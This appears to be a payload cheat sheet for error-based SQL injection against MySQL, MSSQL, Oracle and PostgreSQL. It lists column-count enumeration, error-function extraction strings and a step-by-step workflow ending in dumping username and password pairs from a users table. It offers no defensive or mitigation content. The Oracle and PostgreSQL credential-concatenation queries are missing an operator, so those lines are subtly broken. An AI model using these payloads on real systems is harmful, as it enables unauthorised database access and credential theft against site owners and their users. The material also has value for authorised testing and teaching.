# Error-based SQL Injection

## Overview

Error-based SQLi extracts data through database error messages. Works when:
- Application displays verbose error messages
- DBMS has exploitable error functions

## Column Count Enumeration

### ORDER BY Method

```sql
' ORDER BY 1--    -- No error
' ORDER BY 2--    -- No error
' ORDER BY 3--    -- No error
' ORDER BY 4--    -- Error = 3 columns
```

### UNION SELECT NULL Method

```sql
' UNION SELECT NULL--           -- Error
' UNION SELECT NULL,NULL--      -- Error  
' UNION SELECT NULL,NULL,NULL-- -- Success
```

## MySQL Error-based

### EXTRACTVALUE (MySQL 5.1+)

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1),0x7e))--
```

### UPDATEXML (MySQL 5.1+)

```sql
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
```

### Double Query (SubQuery)

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user FROM mysql.user LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### NAME_CONST (MySQL 5.0.12+)

```sql
' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--
```

## MSSQL Error-based

### CONVERT/CAST

```sql
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
```

```sql
' AND 1=CAST(@@version AS int)--
' AND 1=CAST((SELECT TOP 1 username FROM users) AS int)--
```

### Visible Error Messages

```sql
' AND 1=1/(SELECT TOP 1 table_name FROM information_schema.tables)--
```

### XML PATH Extraction

```sql
' AND 1=CAST((SELECT name AS "data()" FROM master..sysdatabases FOR XML PATH('')) AS int)--
```

## Oracle Error-based

### UTL_INADDR

```sql
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--
```

### CTXSYS.DRITHSX.SN

```sql
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))--
```

### DBMS_XMLGEN

```sql
' AND 1=(SELECT TO_CHAR(DBMS_XMLGEN.GETXML('SELECT user FROM dual')) FROM dual)--
```

### XMLType

```sql
' AND (SELECT XMLTYPE('<:'||(SELECT user FROM dual)||'>') FROM dual) IS NOT NULL--
```

## PostgreSQL Error-based

### CAST to Numeric

```sql
' AND 1=CAST(version() AS numeric)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS numeric)--
```

### chr() Concatenation

```sql
',CAST(CHR(126)||version()||CHR(126) AS numeric)--
',CAST(CHR(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0)||CHR(126) AS numeric)--
```

## Data Extraction Workflow

### Step 1: Get Database Name

| DBMS | Query |
|------|-------|
| MySQL | `SELECT database()` |
| MSSQL | `SELECT DB_NAME()` |
| Oracle | `SELECT SYS.DATABASE_NAME FROM dual` |
| PostgreSQL | `SELECT current_database()` |

### Step 2: Enumerate Tables

| DBMS | Query |
|------|-------|
| MySQL | `SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1` |
| MSSQL | `SELECT TOP 1 table_name FROM information_schema.tables` |
| Oracle | `SELECT table_name FROM all_tables WHERE ROWNUM=1` |
| PostgreSQL | `SELECT table_name FROM information_schema.tables LIMIT 1` |

### Step 3: Enumerate Columns

| DBMS | Query |
|------|-------|
| MySQL | `SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1` |
| MSSQL | `SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'` |
| Oracle | `SELECT column_name FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM=1` |
| PostgreSQL | `SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1` |

### Step 4: Extract Data

| DBMS | Query |
|------|-------|
| MySQL | `SELECT CONCAT(username,':',password) FROM users LIMIT 0,1` |
| MSSQL | `SELECT TOP 1 username+':'+password FROM users` |
| Oracle | `SELECT username\|\|':'password FROM users WHERE ROWNUM=1` |
| PostgreSQL | `SELECT username\|\|':'password FROM users LIMIT 1` |

## Tips

- Use `LIMIT X,1` (MySQL) or `OFFSET X` (PostgreSQL) to iterate rows
- Use `TOP 1` with subquery for MSSQL pagination
- Oracle requires `ROWNUM` in WHERE clause
- Max error output often ~100-200 characters
